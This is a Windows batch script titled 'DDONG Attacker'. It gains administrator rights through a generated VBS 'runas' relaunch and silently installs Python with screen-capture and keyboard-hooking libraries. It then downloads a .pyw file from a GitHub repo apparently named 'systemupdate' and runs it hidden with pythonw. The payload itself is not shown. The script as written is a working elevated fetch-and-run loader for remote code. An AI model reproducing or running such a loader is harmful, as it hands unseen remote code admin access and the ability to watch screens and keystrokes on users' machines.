@echo off
set PATH=%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%PATH%

title DDONG Attacker

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
)
pushd "%~dp0"

py -3.11 --version >nul 2>&1
if %errorlevel% neq 0 (
    curl -o py311_installer.exe https://www.python.org/ftp/python/3.11.8/python-3.11.8-amd64.exe
    if exist py311_installer.exe (
        start /wait py311_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
        del py311_installer.exe
    ) else (
        pause
        exit /b
    )
)

set PATH=C:\Program Files\Python311\Scripts\;C:\Program Files\Python311\;%PATH%
set PATH=%LocalAppData%\Programs\Python\Python311\Scripts\;%LocalAppData%\Programs\Python\Python311\;%PATH%

py -3.11 -m pip install --upgrade pip --quiet
py -3.11 -m pip install numpy pillow mss keyboard --quiet

curl -L -o "%~dp0attacker_hp.pyw" "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/attacker_hp.pyw?t=%RANDOM%"

for /f "tokens=*" %%i in ('py -3.11 -c "import os, sys; print(os.path.join(os.path.dirname(sys.executable), 'pythonw.exe'))"') do set PW=%%i
start "" "%PW%" "%~dp0attacker_hp.pyw"

exit
